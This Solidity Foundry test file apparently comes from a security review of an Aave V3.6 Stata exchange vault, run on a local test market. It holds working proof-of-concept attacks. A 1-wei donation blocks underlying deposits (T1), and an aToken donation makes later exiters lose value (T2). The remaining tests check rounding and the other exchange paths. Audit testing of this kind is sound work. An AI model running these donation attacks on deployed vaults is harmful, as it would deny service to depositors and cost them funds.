// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IBasicVault} from "contracts/interfaces/IBasicVault.sol";
import {
    TestBase_AaveV3StataStandardExchange_Decimals,
    AaveV3StataDecimalsListing
} from "contracts/test/bases/TestBase_AaveV3StataStandardExchange_Decimals.sol";
import {
    MockAggregator
} from "@crane/contracts/protocols/lending/aave/v3.6/utils/mocks/oracle/CLAggregators/MockAggregator.sol";
import {StataTokenV2} from "@crane/contracts/protocols/lending/aave/v3.6/extensions/stata-token/StataTokenV2.sol";
import {IPoolConfigurator} from "@crane/contracts/protocols/lending/aave/v3.6/interfaces/IPoolConfigurator.sol";
import {LendingAccountingToken} from "test/foundry/spec/vaults/standard/exchange/invariant/LendingAccountingHandler.sol";

interface ISE {
    function exchangeIn(address in_, uint256 amt, address out_, uint256 min_, address to_, bool prepaid, uint256 dl)
        external
        returns (uint256 amountOut, uint256 amountRefunded);
    function exchangeOut(address in_, uint256 max_, address out_, uint256 amt, address to_, bool prepaid, uint256 dl)
        external
        returns (uint256);
    function previewExchangeIn(address in_, uint256 amt, address out_) external view returns (uint256 amountOut, uint256 amountRefunded);
    function previewExchangeOut(address in_, address out_, uint256 amt) external view returns (uint256);
}

/// @notice gx-aave-stata: targeted adversarial tests for the Aave V3.6 Stata SE (HEAD 2ba07631).
/// Real Crane Aave v3.6 market + StataTokenV2 + IndexedEx Stata SE diamond, listed mintable 18-dec asset.
contract GxAaveStataAdversarial is TestBase_AaveV3StataStandardExchange_Decimals {
    address internal constant BORROWER = address(0xB0220);
    address internal constant LP = address(0x11F0);
    address internal constant DEAD = address(0xdEaD);
    address internal honestA;
    address internal honestB;
    address internal se;
    address internal aTok;

    function _underlyingDecimals() internal pure override returns (uint8) {
        return 18;
    }

    function setUp() public override {
        super.setUp();
        address asset = address(new LendingAccountingToken());
        AaveV3StataDecimalsListing listing =
            new AaveV3StataDecimalsListing(asset, address(new MockAggregator(int256(1e8))), report.configEngine);
        vm.prank(roleList.marketOwner);
        contracts.aclManager.addPoolAdmin(address(listing));
        listing.execute();
        address[] memory assets = new address[](1);
        assets[0] = asset;
        factory.createStataTokens(assets);
        underlying = asset;
        realBase = asset;
        aTok = contracts.poolProxy.getReserveAToken(asset);
        aToken = aTok;
        stataTokenV2 = StataTokenV2(factory.getStataToken(asset));
        realStata = address(stataTokenV2);
        realVault = _deployStataVault(realStata);
        se = realVault;
        _setTestUsageFee(0);
        honestA = makeAddr("honestA");
        honestB = makeAddr("honestB");

        // Real Aave market activity: LP liquidity + borrower so the liquidity index > RAY.
        _mintU(LP, 3000e18);
        vm.startPrank(LP);
        IERC20(realBase).approve(address(contracts.poolProxy), type(uint256).max);
        contracts.poolProxy.supply(realBase, 3000e18, LP, 0);
        vm.stopPrank();
        _mintU(BORROWER, 2000e18);
        vm.startPrank(BORROWER);
        IERC20(realBase).approve(address(contracts.poolProxy), type(uint256).max);
        contracts.poolProxy.supply(realBase, 2000e18, BORROWER, 0);
        contracts.poolProxy.borrow(realBase, 1500e18, 2, 0, BORROWER);
        vm.stopPrank();
        vm.warp(block.timestamp + 180 days);
        // poke the reserve so the index is updated on-chain too
        _mintU(LP, 1e18);
        vm.prank(LP);
        contracts.poolProxy.supply(realBase, 1e18, LP, 0);
        console2.log("stata rate assets/1e18 shares", stataTokenV2.convertToAssets(1e18));
        require(stataTokenV2.convertToAssets(1e18) > 1e18, "index > RAY");
        // dead seed (removes first-deposit inflation, a known class)
        _deposit(address(this), 1e18, DEAD);
    }

    /* ------------------------------------------------------------------ helpers */
    function _mintU(address to, uint256 amt) internal {
        LendingAccountingToken(realBase).mint(to, amt);
    }

    function _deposit(address from, uint256 amt, address to) internal returns (uint256 shares) {
        _mintU(from, amt);
        vm.startPrank(from);
        IERC20(realBase).approve(se, type(uint256).max);(shares,) = ISE(se).exchangeIn(realBase, amt, se, 1, to, false, block.timestamp + 1);
        vm.stopPrank();
    }

    function _stataTo(address to, uint256 underlyingAmt) internal returns (uint256 s) {
        _mintU(address(this), underlyingAmt);
        IERC20(realBase).approve(realStata, underlyingAmt);
        s = stataTokenV2.deposit(underlyingAmt, to);
    }

    function _aTokenTo(address to, uint256 amt) internal {
        _mintU(address(this), amt + 2);
        IERC20(realBase).approve(address(contracts.poolProxy), amt + 2);
        contracts.poolProxy.supply(realBase, amt + 2, address(this), 0);
        IERC20(aTok).transfer(to, amt);
    }

    function _bal(address t, address who) internal view returns (uint256) {
        return IERC20(t).balanceOf(who);
    }

    function _fairNav() internal view returns (uint256) {
        uint256 bookedU = IBasicVault(se).reserveOfToken(realBase);
        uint256 balU = _bal(realBase, se);
        return stataTokenV2.convertToAssets(_bal(realStata, se)) + (bookedU < balU ? bookedU : balU);
    }

    function _redeemAllToUnderlying(address who) internal returns (bool ok, uint256 got) {
        uint256 sh = _bal(se, who);
        uint256 b0 = _bal(realBase, who);
        vm.prank(who);try ISE(se).exchangeIn(se, sh, realBase, 0, who, false, block.timestamp + 1) returns (uint256, uint256) {
            ok = true;
        } catch {}
        got = _bal(realBase, who) - b0;
    }

    /* ======================================================================
     * T1: 1-wei underlying donation, booked at end-of-op sync, makes every
     *     later underlying->SE entry revert (D22 sweep of a sub-share remnant).
     * ==================================================================== */
    function test_T1_dustUnderlyingDonation_bricksUnderlyingEntry() public {
        // control: honest deposit works
        _deposit(honestA, 100e18, honestA);
        assertEq(IBasicVault(se).reserveOfToken(realBase), 0, "no booked underlying");

        // attacker: 1 wei donation + any syncing op (own 1e15 deposit)
        address atk = makeAddr("atk");
        _mintU(atk, 1);
        vm.prank(atk);
        IERC20(realBase).transfer(se, 1);
        _deposit(atk, 1e15, atk);
        assertEq(IBasicVault(se).reserveOfToken(realBase), 1, "1 wei booked as local underlying");
        console2.log("previewDeposit(1 wei)", stataTokenV2.previewDeposit(1));

        // victim exact-in underlying -> SE
        _mintU(honestB, 50e18);
        vm.startPrank(honestB);
        IERC20(realBase).approve(se, type(uint256).max);
        (bool okIn, bytes memory errIn) = se.call(
            abi.encodeCall(ISE.exchangeIn, (realBase, 50e18, se, 1, honestB, false, block.timestamp + 1))
        );
        // victim exact-out wrap underlying -> exact SE shares
        (bool okOut, bytes memory errOut) = se.call(
            abi.encodeCall(ISE.exchangeOut, (realBase, 60e18, se, 40e18, honestB, false, block.timestamp + 1))
        );
        // victim SY deposit(receiver, underlying, amount, min)
        (bool okSy, bytes memory errSy) = se.call(
            abi.encodeWithSignature("deposit(address,address,uint256,uint256)", honestB, realBase, 50e18, 1)
        );
        vm.stopPrank();
        console2.log("victim SY deposit ok?", okSy);
        console2.logBytes(errSy);
        assertFalse(okSy, "SY underlying deposit bricked");
        console2.log("victim exactIn ok?", okIn);
        console2.logBytes(errIn);
        console2.log("victim exactOut wrap ok?", okOut);
        console2.logBytes(errOut);
        assertFalse(okIn, "underlying exact-in entry bricked");
        assertFalse(okOut, "underlying exact-out wrap bricked");
        assertEq(bytes4(errIn), bytes4(keccak256("StaticATokenInvalidZeroShares()")), "zero-share sweep");

        // persists across time while nobody exits to underlying
        vm.warp(block.timestamp + 7 days);
        _mintU(honestB, 1);
        vm.startPrank(honestB);
        (okIn,) = se.call(
            abi.encodeCall(ISE.exchangeIn, (realBase, 50e18, se, 1, honestB, false, block.timestamp + 1))
        );
        vm.stopPrank();
        assertFalse(okIn, "still bricked after 7 days");

        // stata entry still works (only underlying face is DoSed)
        uint256 s = _stataTo(honestB, 10e18);
        vm.startPrank(honestB);
        IERC20(realStata).approve(se, s);ISE(se).exchangeIn(realStata, s, se, 1, honestB, false, block.timestamp + 1);
        vm.stopPrank();
        assertEq(IBasicVault(se).reserveOfToken(realBase), 1, "stata route does not clear it");

        // recovery: an underlying exit consumes the booked local wei first
        vm.prank(honestA);ISE(se).exchangeIn(se, 1e18, realBase, 0, honestA, false, block.timestamp + 1);
        assertEq(IBasicVault(se).reserveOfToken(realBase), 0, "exit cleared local wei");
        // re-grief costs 1 wei + gas again
        _mintU(atk, 1);
        vm.prank(atk);
        IERC20(realBase).transfer(se, 1);
        _deposit(atk, 1e15, atk);
        assertEq(IBasicVault(se).reserveOfToken(realBase), 1, "re-griefed");
    }

    /* ======================================================================
     * T2: booked aToken (expected-hold extra) is counted in backing but no
     *     exit route can pay aToken -> early exiters take later exiters' stata.
     * ==================================================================== */
    function test_T2_aTokenDonation_lastExiterLoss() public {
        _deposit(honestA, 100e18, honestA);
        _deposit(honestB, 100e18, honestB);
        uint256 navB0 = _fairNav() * _bal(se, honestB) / IERC20(se).totalSupply();

        address atk = makeAddr("atk");
        _aTokenTo(atk, 10e18);
        vm.prank(atk);
        IERC20(aTok).transfer(se, 10e18);
        _deposit(atk, 1e15, atk); // syncs aToken into the book
        console2.log("booked aToken", IBasicVault(se).reserveOfToken(aTok));
        assertGt(IBasicVault(se).reserveOfToken(aTok), 0, "aToken booked as extra");

        (bool okA, uint256 gotA) = _redeemAllToUnderlying(honestA);
        assertTrue(okA, "first exiter full exit ok");
        (bool okB,) = _redeemAllToUnderlying(honestB);
        console2.log("A got", gotA, "B full exit ok?", okB);

        // B can only exit what is left in held stata
        uint256 shB = _bal(se, honestB);
        uint256 lo = 0;
        uint256 hi = shB;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            try this.previewProbe(mid) returns (bool can) {
                if (can) lo = mid; else hi = mid - 1;
            } catch {
                hi = mid - 1;
            }
        }
        uint256 b0 = _bal(realBase, honestB);
        if (lo > 0) {
            vm.prank(honestB);ISE(se).exchangeIn(se, lo, realBase, 0, honestB, false, block.timestamp + 1);
        }
        uint256 gotB = _bal(realBase, honestB) - b0;
        console2.log("B max realisable", gotB, "B fair pre-donation", navB0);
        console2.log("aToken stranded in SE", _bal(aTok, se));
        assertFalse(okB, "last exiter cannot fully exit");
        assertLt(gotB, navB0, "last exiter realises less than pre-donation fair value");
    }

    /// @dev external probe used by the binary search (reverts are swallowed by try/catch).
    function previewProbe(uint256 shares) external returns (bool) {
        uint256 snap = vm.snapshotState();
        vm.prank(honestB);
        (bool ok,) = se.call(
            abi.encodeCall(ISE.exchangeIn, (se, shares, realBase, 0, honestB, false, block.timestamp + 1))
        );
        vm.revertToState(snap);
        return ok;
    }

    /// @dev T2b: dust aToken (a few wei, e.g. depositATokens rounding remnant) blocks a sole holder's full exit.
    function test_T2b_dustAToken_blocksSoleHolderFullExit() public {
        // drain the dead seed holder out of the picture: use a fresh vault
        address v = _deployStataVault(realStata);
        se = v;
        _deposit(honestA, 100e18, honestA);
        _aTokenTo(address(this), 3);
        IERC20(aTok).transfer(se, 3);
        _deposit(honestB, 1e12, honestB); // sync
        (bool okB,) = _redeemAllToUnderlying(honestB);
        // [reviewer fix] probe the stata face BEFORE A's underlying exit; previously A had 0 shares
        // here, so the stata exit reverted on amount_==0 (InvalidStataPayment), not on dust aToken.
        uint256 snapA = vm.snapshotState();
        (bool okA,) = _redeemAllToUnderlying(honestA);
        console2.log("B ok", okB, "A (last, full) ok", okA);
        vm.revertToState(snapA);
        // stata out too
        uint256 sh = _bal(se, honestA);
        console2.log("A shares for stata exit", sh);
        vm.prank(honestA);
        (bool okS,) = se.call(
            abi.encodeCall(ISE.exchangeIn, (se, sh, realStata, 0, honestA, false, block.timestamp + 1))
        );
        console2.log("A full exit to stata ok", okS);
        // [reviewer] REFUTED: with the probe fixed, 3 wei dust aToken blocks neither full-exit face.
        assertTrue(okA && okS, "T2b refuted: dust aToken does not block sole-holder full exit");
    }

    /* ======================================================================
     * T3: exact-out wrap vs exact-in redeem round trips: no free value.
     * ==================================================================== */
    function test_T3_exactOutWrap_roundTrip_noProfit() public {
        _deposit(honestA, 500e18, honestA);
        address atk = makeAddr("atk");
        uint256 start = 1000e18;
        _mintU(atk, start);
        vm.startPrank(atk);
        IERC20(realBase).approve(se, type(uint256).max);
        uint256[6] memory outs = [uint256(1), 2, 3, 7, 1e9 + 1, 333333333333333333];
        for (uint256 r; r < 40; ++r) {
            uint256 want = outs[r % 6];
            ISE(se).exchangeOut(realBase, type(uint256).max, se, want, atk, false, block.timestamp + 1);
        }
        uint256 sh = _bal(se, atk);ISE(se).exchangeIn(se, sh, realBase, 0, atk, false, block.timestamp + 1);
        vm.stopPrank();
        uint256 end = _bal(realBase, atk);
        console2.log("atk start/end", start, end);
        assertLe(end, start, "no profit from exact-out wrap rounding");
    }

    /* ======================================================================
     * T4: exact-out unwrap tiny amounts: ceil share burn, no free underlying.
     * ==================================================================== */
    function test_T4_exactOutUnwrap_tiny_noFreeExit() public {
        _deposit(honestA, 500e18, honestA);
        address atk = makeAddr("atk");
        _deposit(atk, 1e18, atk);
        uint256 navBefore = _fairNav();
        uint256 sh0 = _bal(se, atk);
        uint256 got;
        vm.startPrank(atk);
        for (uint256 i; i < 60; ++i) {
            uint256 amt = i % 3 == 0 ? 1 : (i % 3 == 1 ? 2 : 1e6 + 1);
            uint256 b0 = _bal(realBase, atk);
            ISE(se).exchangeOut(se, type(uint256).max, realBase, amt, atk, false, block.timestamp + 1);
            got += _bal(realBase, atk) - b0;
        }
        vm.stopPrank();
        uint256 burned = sh0 - _bal(se, atk);
        uint256 fairBurned = navBefore * burned / (IERC20(se).totalSupply() + burned);
        console2.log("got underlying", got, "fair value of burned shares", fairBurned);
        assertGe(fairBurned + 2, got, "exact-out never pays more than burned share value");
        assertGt(burned, 0, "shares burned");
    }

    /* ======================================================================
     * T5: supply cap reached: D22 books input locally; stata->underlying swap
     *     drains local cash. Check SE holders' fair NAV is conserved.
     * ==================================================================== */
    function test_T5_capFull_stataToUnderlyingSwap_conservesNav() public {
        _deposit(honestA, 200e18, honestA);
        // attacker pre-buys stata before the cap closes
        address atk = makeAddr("atk");
        uint256 sAtk = _stataTo(atk, 150e18);
        vm.prank(roleList.marketOwner);
        contracts.aclManager.addPoolAdmin(address(this));
        IPoolConfigurator(address(contracts.poolConfiguratorProxy)).setSupplyCap(realBase, 1);
        assertEq(stataTokenV2.maxDeposit(se), 0, "cap full");
        _deposit(honestB, 100e18, honestB);
        uint256 local = IBasicVault(se).reserveOfToken(realBase);
        console2.log("booked local underlying", local);
        assertApproxEqAbs(local, 100e18, 1, "D22 booked input locally");
        uint256 supply = IERC20(se).totalSupply();
        uint256 navPerShare0 = _fairNav() * 1e18 / supply;

        uint256 fairAtkIn = stataTokenV2.convertToAssets(sAtk);
        vm.startPrank(atk);
        IERC20(realStata).approve(se, sAtk);(uint256 out,) = ISE(se).exchangeIn(realStata, sAtk, realBase, 0, atk, false, block.timestamp + 1);
        vm.stopPrank();
        uint256 navPerShare1 = _fairNav() * 1e18 / IERC20(se).totalSupply();
        console2.log("atk stata fair / underlying out", fairAtkIn, out);
        console2.log("nav/share before/after", navPerShare0, navPerShare1);
        assertLe(out, fairAtkIn, "swap pays <= fair");
        assertGe(navPerShare1 + 1, navPerShare0, "holders not diluted");

        // SE holders can still exit (stata -> underlying through Aave liquidity)
        (bool okB, uint256 gotB) = _redeemAllToUnderlying(honestB);
        console2.log("B exit ok / got", okB, gotB);
        assertTrue(okB, "holder exit after local cash drained");
        assertGe(gotB + 2, 100e18 - 1e15, "B gets ~deposit back");
    }

    /* ======================================================================
     * T6: aToken -> SE exact-in (pull) liveness at index > RAY.
     * ==================================================================== */
    function test_T6_aTokenIn_pullLiveness() public {
        _deposit(honestA, 100e18, honestA);
        address u = makeAddr("aTokUser");
        _aTokenTo(u, 100e18);
        vm.startPrank(u);
        IERC20(aTok).approve(se, type(uint256).max);
        uint256 ok;
        uint256 fail;
        uint256[8] memory amts = [uint256(1e18), 1e18 + 1, 3e18 + 7, 12345678901234567, 5e17 + 3, 7e18 + 1, 1e9 + 3, 2e18];
        for (uint256 i; i < 8; ++i) {try ISE(se).exchangeIn(aTok, amts[i], se, 1, u, false, block.timestamp + 1) returns (uint256, uint256) {
                ++ok;
            } catch (bytes memory e) {
                ++fail;
                console2.log("aToken pull revert amount", amts[i]);
                console2.logBytes(e);
            }
        }
        vm.stopPrank();
        console2.log("aToken->SE ok/fail", ok, fail);
        console2.log("aToken dust left in SE", _bal(aTok, se), "booked", IBasicVault(se).reserveOfToken(aTok));
        // Coverage evidence only: record liveness ratio.
        assertGt(ok + fail, 0);
    }

    /* ======================================================================
     * T7: prepaid stata exact-in: quote == pull path; no double count.
     * ==================================================================== */
    function test_T7_prepaidVsPull_stataEntryEquality() public {
        _deposit(honestA, 300e18, honestA);
        Pre pre = new Pre();
        uint256 s1 = _stataTo(address(pre), 40e18);
        uint256 s2 = _stataTo(address(this), 40e18);
        assertEq(s1, s2);
        uint256 snap = vm.snapshotState();
        uint256 sharesPre = pre.go(se, realStata, s1);
        vm.revertToState(snap);
        IERC20(realStata).approve(se, s2);(uint256 sharesPull,) = ISE(se).exchangeIn(realStata, s2, se, 1, address(this), false, block.timestamp + 1);
        console2.log("prepaid / pull shares", sharesPre, sharesPull);
        assertEq(sharesPre, sharesPull, "prepaid == pull");
    }
}

contract Pre {
    function go(address se, address stata, uint256 amt) external returns (uint256) {
        IERC20(stata).transfer(se, amt);(uint256 quotedAmountOut,) = ISE(se).exchangeIn(stata, amt, se, 1, address(this), true, block.timestamp + 1);
        return quotedAmountOut;
    }
}
